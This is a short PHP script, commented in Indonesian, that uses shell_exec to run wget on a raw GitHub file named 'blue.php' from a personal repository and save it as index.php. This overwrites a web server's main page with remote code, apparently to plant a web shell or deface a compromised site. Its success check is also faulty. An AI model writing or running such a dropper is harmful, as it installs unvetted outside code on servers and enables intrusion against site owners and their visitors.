<?php
$url = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/blue.php'; // Ganti dengan URL file yang ingin diunduh

// Lakukan pengunduhan file menggunakan wget dan simpan sebagai index.php
$command = 'wget ' . $url . ' -O index.php';
$output = shell_exec($command);

if ($output === null) {
    echo "File berhasil diunduh dan disimpan sebagai index.php";
} else {
    echo "Ada kesalahan dalam pengunduhan file.";
}
?>
